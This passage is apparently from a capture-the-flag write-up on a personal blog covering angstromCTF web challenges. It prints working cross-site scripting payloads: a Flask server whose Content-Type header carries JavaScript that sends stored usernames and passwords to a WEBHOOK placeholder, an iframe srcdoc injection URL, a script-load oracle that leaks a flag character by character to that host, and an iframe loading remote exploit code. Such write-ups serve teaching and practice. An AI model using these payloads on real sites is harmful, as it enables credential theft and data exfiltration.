</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> { <span style="color:#a6e22e">success</span>: <span style="color:#66d9ef">true</span> <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">const</span> }
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-typescript" data-lang="typescript"><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">route</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;/picture&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;?&#39;</span>)) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">end</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#39;?&#39;</span>)))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">query</span>.<span style="color:#66d9ef">get</span>(<span style="color:#e6db74">&#39;username&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">username</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">null</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">end</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">picture</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pictures</span>.<span style="color:#66d9ef">get</span>(<span style="color:#a6e22e">username</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">picture</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">undefined</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">end</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">data</span>, <span style="color:#66d9ef">type</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">picture</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">`data:</span><span style="color:#e6db74">${</span><span style="color:#66d9ef">type</span><span style="color:#e6db74">}</span><span style="color:#e6db74">;base64,</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">data</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We could modify the Content-Type.
But can javascript execute anything with <code>data:</code> in front of it? The answer is yes, actually, it can execute anything <code>anything:</code> before colon, because javascript treat those as labels. <!-- raw HTML omitted -->labeled statement<!-- raw HTML omitted -->
So, simply host a Flask server</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, make_response
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__, static_folder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;static&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_headers</span>():
</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> make_response(<span style="color:#e6db74">&#34;hehe&#34;</span>)
</span></span><span style="display:flex;"><span>    response<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Content-Type&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;document.location=`WEBHOOK/?c=${localStorage.getItem(&#34;username&#34;)}_${localStorage.getItem(&#34;password&#34;)}`//&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(port<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>, host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>)
</span></span></code></pre></div><h3 id="execute">Execute<a hidden class="anchor" aria-hidden="true" href="#execute">#</a></h3>
<p>We could simply add</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/picture?username=testtesttest&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p>to the login page right? No, because our script tag was added after the client.js load. How to deal with this? Iframe. We can have an iframe that run our javascript.
That&rsquo;s how we got this URL.</p>
<pre tabindex="0"><code>https://tickler.web.actf.co/login?error=%3Ciframe%20srcdoc=%27%3Cscript%20src=%22/picture?username=testtesttest%22%3E%3C/script%3E%27%3E
</code></pre><p>The rest leaves to you then.</p>
<h2 id="wonderful-wicked-wrathful-wiretapping-wholesale-world-wide-watermark-as-a-service">Wonderful Wicked Wrathful Wiretapping Wholesale World Wide Watermark as a Service<a hidden class="anchor" aria-hidden="true" href="#wonderful-wicked-wrathful-wiretapping-wholesale-world-wide-watermark-as-a-service">#</a></h2>
<p>This challenege was not pretty hard, because we could use img or script tag to check whether a site is 404 or 200. To be honest, this won&rsquo;t work for latest version of Chrome, because of Chrome&rsquo;s ORB. But luckily, the browser of admin bot was outdated. And another factor was that they configured the challenge&rsquo;s sites with SameSite policy, that&rsquo;s why the unintended trick worked.
The exploit script</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">flag</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;actf{&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">index</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">search</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">charset</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0123456789abcdefghijklmnopqrstuvwxyz_}&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">charset</span>[<span style="color:#a6e22e">index</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">s</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;script&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://wwwwwwwwaas.web.actf.co/search?q=&#34;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">flag</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">c</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> () =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">flag</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">c</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">index</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>().<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span>(<span style="color:#e6db74">&#34;WEBHOOK/?flag=&#34;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">flag</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">search</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">onerror</span>  <span style="color:#f92672">=</span> () =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">index</span><span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">search</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">s</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">search</span>();
</span></span></code></pre></div><p>And in the Markdown challenge, we simply used</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;script src=&#39;HOST/exploit.js&#39;&gt;&lt;/script&gt;&#34;</span>/&gt;
</span></span></code></pre></div><p>That&rsquo;s it.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">My New Hugo Site</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
